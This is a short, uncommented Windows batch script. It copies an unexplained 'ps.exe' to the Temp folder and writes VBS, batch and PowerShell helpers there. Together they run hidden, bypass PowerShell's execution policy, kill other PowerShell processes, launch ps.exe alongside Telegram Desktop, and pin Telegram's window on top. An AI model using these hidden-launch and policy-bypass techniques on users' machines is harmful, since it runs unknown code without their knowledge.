@echo off
set TempName=temp111
:check
if not exist "%Temp%\%TempName%.vbs" goto build
"%Temp%\%TempName%.vbs"
exit
:build
copy "ps.exe" "%Temp%\ps.exe" > nul
set App1=telegram
set AppPath1=%APPDATA%\Telegram Desktop\Telegram.exe
set App2=ps
set AppPath2=%Temp%\ps.exe
echo taskkill /f /im powershell.exe > "%Temp%\%TempName%.bat"
echo powershell.exe -ExecutionPolicy Bypass -File "%Temp%\%TempName%.ps1" >> "%Temp%\%TempName%.bat"
echo Set WshShell = CreateObject("WScript.Shell") > "%Temp%\%TempName%.vbs"
echo WshShell.Run chr(34) ^& "%Temp%\%TempName%.bat" ^& Chr(34), 0 >> "%Temp%\%TempName%.vbs"
echo Set WshShell = Nothing >> "%Temp%\%TempName%.vbs"
echo Invoke-Item "%AppPath2%" > "%Temp%\%TempName%.ps1"
echo Invoke-Item "%AppPath1%" >> "%Temp%\%TempName%.ps1"
echo for (;;){$User32 = Add-Type -Debug:$False -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X,int Y, int cx, int cy, uint uFlags);' -Name "User32Functions" -namespace User32Functions -PassThru ; $Handle = (Get-Process -Name '%App1%').MainWindowHandle;[Void]$User32::SetWindowPos($Handle, -1, 0, 0, 0, 0, 0x53) >> "%Temp%\%TempName%.ps1"
echo If(!(Get-Process -Name '%App1%' -ErrorAction SilentlyContinue)){$User32 = Add-Type -Debug:$False -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X,int Y, int cx, int cy, uint uFlags);' -Name "User32Functions" -namespace User32Functions -PassThru ; $Handle = (Get-Process -Name 'ps').MainWindowHandle;[Void]$User32::SetWindowPos($Handle, -1, 0, 0, 0, 0, 0x53) >> "%Temp%\%TempName%.ps1"
echo exit} >> "%Temp%\%TempName%.ps1"
echo timeout 5} >> "%Temp%\%TempName%.ps1"
goto check